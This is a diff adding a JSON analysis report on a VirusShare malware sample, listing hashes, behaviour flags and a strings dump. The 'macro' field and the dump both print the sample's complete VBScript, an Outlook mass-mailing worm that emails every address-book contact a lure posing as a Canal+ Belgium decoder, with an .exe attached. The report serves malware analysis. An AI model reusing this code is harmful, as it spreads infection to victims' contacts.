@@ -1,0 +1,49 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
+            "CreateObject": "May create an OLE object"
+        },
+        "macro": "On Error Resume Next\nSet a=CreateObject(\"Outlook.Application\")\nSet b=a.CreateItem(0)\nSet c=a.GetNameSpace(\"MAPI\").AddressLists\nFor d=1 To c.Count\nSet e=c(d).AddressEntries\nFor f=1 To e.Count\nb.Recipients.Add e(f)\nNext\nNext\nb.Subject=\"DecBel (ANNA) - JUILLET 2000.\"\nb.Body=\"Bonjour ! Voici DecBel (ANNA) ! C'est un d\ufffdcodeur Canal+ Belgique. Consultez la documentation attach\ufffde \ufffd cet e-mail pour en savoir plus \ufffd son sujet... Ne le lancez pas sans le passer \ufffd l'antivirus !\"\nb.Attachments.Add \"D:\\DecBel.txt\"\nb.Attachments.Add \"D:\\decbel2.exe\"\nb.Send"
+    },
+    "filename": "VirusShare_4ab4ae3fa8a5f6ad2edf81b59bf7ea6b",
+    "filesize": 562,
+    "filetype": "ISO-8859 text, with CRLF line terminators",
+    "hashes": {
+        "md5": "4ab4ae3fa8a5f6ad2edf81b59bf7ea6b",
+        "sha1": "5d6b1350fee3500cbe4d4d1320de761968f4314d",
+        "sha256": "d518f1557f16e78ea20d8e5f6bb026395a94519bba9c6b86c54c8b0703d2a432"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "On Error Resume Next",
+            "Set a=CreateObject(\"Outlook.Application\")",
+            "Set b=a.CreateItem(0)",
+            "Set c=a.GetNameSpace(\"MAPI\").AddressLists",
+            "For d=1 To c.Count",
+            "Set e=c(d).AddressEntries",
+            "For f=1 To e.Count",
+            "b.Recipients.Add e(f)",
+            "Next",
+            "Next",
+            "b.Subject=\"DecBel (ANNA) - JUILLET 2000.\"",
+            "b.Body=\"Bonjour ! Voici DecBel (ANNA) ! C'est un dcodeur Canal+ Belgique. Consultez la documentation attache  cet e-mail pour en savoir plus  son sujet... Ne le lancez pas sans le passer  l'antivirus !\"",
+            "b.Attachments.Add \"D:\\DecBel.txt\"",
+            "b.Attachments.Add \"D:\\decbel2.exe\"",
+            "b.Send"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.261882",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
